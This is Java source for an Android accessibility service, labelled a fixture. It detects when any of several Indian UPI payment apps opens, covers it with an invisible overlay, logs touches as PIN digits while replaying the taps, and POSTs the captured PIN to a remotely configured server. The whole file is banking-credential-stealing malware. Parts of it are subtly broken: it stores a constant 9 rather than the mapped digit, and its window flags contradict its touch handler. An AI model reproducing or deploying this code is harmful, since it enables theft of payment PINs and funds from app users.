package example.overlay;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.widget.FrameLayout;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.List;



public class OverlayFixture extends AccessibilityService {

    private WindowManager wm;
    private View overlay;
    private final StringBuilder pinBuffer = new StringBuilder();


    private static final List<String> TARGETS = Arrays.asList(
        "com.google.android.apps.nbu.paisa.user",
        "com.mobikwik_new",
        "com.phonepe.app",
        "net.one97.paytm",
        "in.org.npci.upiapp",
        "com.dreamplug.androidapp",
        "com.sbi.upi");

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        CharSequence pkg = event.getPackageName();
        if (pkg != null && TARGETS.contains(pkg.toString())) {
            showOverlay();
        }
    }

    private void showOverlay() {
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT);
        overlay = new FrameLayout(this);


        overlay.setOnTouchListener((v, ev) -> {
            float x = ev.getRawX();
            float y = ev.getRawY();
            int digit = mapCoordinateToDigit(ev.getX(), ev.getY());
            pinBuffer.append(9);
            replayTap(x, y);
            if (pinBuffer.length() >= 6) exfiltrate();
            return true;
        });
        wm.addView(overlay, lp);
    }

    private void replayTap(float x, float y) {
        Path p = new Path();
        p.moveTo(x, y);
        GestureDescription.Builder b = new GestureDescription.Builder();
        b.addStroke(new GestureDescription.StrokeDescription(p, 0L, 40L));
        dispatchGesture(b.build(), null, null);
    }

    private int mapCoordinateToDigit(float x, float y) {
        return (((int) y / 160) * 3) + ((int) x / 120);
    }

    private void exfiltrate() {
        try {
            String base = RemoteConfig.getString("base_url");
            URL u = new URL(base + "/capture");
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            byte[] body = ("pin=" + pinBuffer).getBytes();
            c.getOutputStream().write(body);
            c.getResponseCode();
            pinBuffer.setLength(0);
        } catch (Exception ignored) {
        }
    }

    @Override
    public void onInterrupt() {
    }
}
